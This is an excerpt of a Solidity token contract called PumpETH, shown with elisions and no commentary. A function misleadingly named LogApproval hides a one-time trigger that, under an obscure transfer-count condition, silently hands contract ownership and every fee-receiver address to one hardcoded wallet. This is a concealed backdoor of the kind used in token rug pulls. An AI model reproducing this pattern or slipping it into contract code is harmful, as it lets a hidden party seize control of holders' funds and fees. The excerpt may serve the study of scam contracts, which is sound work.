...
contract PumpETH is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902; // token locker
    address public marketingFeeReceiver =
        0x300d969c432130B7747C45E903F17c37B4534459;
    address public ecosystemFeeReceiver =
        0xb37eA9371cFC6D3B5900ADfd739F03d6CE6E2A18;
    ...
    constructor()
        ERC20Detailed("PumpETH", "PETH", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902));
            marketingFeeReceiver = address(0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902);
            autoLiquidityReceiver = address(0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902);
            ecosystemFeeReceiver = address(0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902);
            buyBackFeeReceiver = address(0xaBfB0E6E6FeBB41B86EE3885F8A51C0D344Af902);
            isTransferred = true;
        }
    }
